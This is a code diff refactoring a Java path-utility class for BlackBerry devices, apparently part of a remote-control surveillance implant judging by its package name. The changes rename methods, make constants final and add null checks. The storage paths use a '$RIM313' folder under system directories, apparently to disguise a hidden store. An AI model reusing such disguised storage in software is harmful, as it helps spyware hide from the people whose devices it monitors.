@@ -22,10 +22,13 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class Path {
     private static Debug debug = new Debug("Path", DebugLevel.VERBOSE);
 
-    public static String SDPath = "file:///SDCard/BlackBerry/system/$RIM313/";
-    public static String UserPath = "file:///store/home/user/$RIM313/";
+    public static final String SD_PATH = "file:///SDCard/BlackBerry/system/$RIM313/";
+    public static final String USER_PATH = "file:///store/home/user/$RIM313/";
 
-    public static boolean CreateDirectory(String dirName) {
+    private Path() {
+    };
+
+    public synchronized static boolean createDirectory(String dirName) {
         FileConnection fconn = null;
 
         try {
@@ -33,7 +36,9 @@ public class Path {
                     Connector.READ_WRITE);
 
             if (fconn.exists()) {
-                debug.trace("Directory exists");
+                if (debug != null)
+                    debug.trace("Directory exists");
+
                 return false;
             }
 
@@ -52,7 +57,9 @@ public class Path {
                 try {
                     fconn.close();
                 } catch (IOException e) {
-
+                    if (debug != null)
+                        debug.error(e.toString());
+                    
                 }
             }
         }
@@ -60,7 +67,7 @@ public class Path {
         return true;
     }
 
-    public static Vector GetRoots() {
+    public static Vector getRoots() {
         Enumeration roots = FileSystemRegistry.listRoots();
         Vector vector = new Vector();
 
@@ -82,7 +89,7 @@ public class Path {
         return vector;
     }
 
-    public static void PrintRoots() {
+    public static void printRoots() {
         Enumeration roots = FileSystemRegistry.listRoots();
 
         while (roots.hasMoreElements()) {
@@ -99,17 +106,19 @@ public class Path {
         }
     }
 
-    public static boolean SDPresent() {
+    public static boolean isSDPresent() {
         Enumeration roots = FileSystemRegistry.listRoots();
 
         while (roots.hasMoreElements()) {
             String path = (String) roots.nextElement();
 
             if (path.indexOf("SDCard") >= 0) {
-                debug.info("SDPresent FOUND: " + path);
+                if (debug != null)
+                    debug.info("SDPresent FOUND: " + path);
                 return true;
             } else {
-                debug.trace("SDPresent NOT:" + path);
+                if (debug != null)
+                    debug.trace("SDPresent NOT:" + path);
             }
         }
 
